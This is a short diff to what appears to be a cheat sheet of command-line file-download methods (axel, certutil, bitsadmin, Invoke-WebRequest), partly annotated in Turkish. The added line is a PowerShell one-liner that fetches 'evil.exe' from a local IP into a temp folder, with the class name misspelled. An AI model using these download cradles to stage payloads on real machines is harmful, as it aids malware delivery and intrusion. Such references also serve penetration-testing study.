@@ -21,3 +21,4 @@ axel http://website.com/file
 certutil.exe --urlcache -split -f "<url>"
 bitsadmin.exe /transfer n "<url>" "dosyanın koyulacağı yer"
 Invoke-WebRequest https://path/to/file.txt -OutFile C:\file.txt
+powershell.exe (New-Object Sytem.Net.webClient).DownloadFile('http://192.168.1.1/evil.exe','C:\Users\Default\AppData\local\temp\evil.exe')
